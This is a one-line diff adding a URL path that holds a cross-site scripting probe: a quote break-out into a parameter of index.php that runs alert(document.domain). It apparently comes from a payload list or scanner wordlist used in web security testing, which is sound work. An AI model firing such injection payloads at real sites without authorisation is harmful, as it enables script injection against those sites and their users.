@@ -1,0 +1,1 @@
+/index.php?v=d&p=%22;alert(document.domain);%22
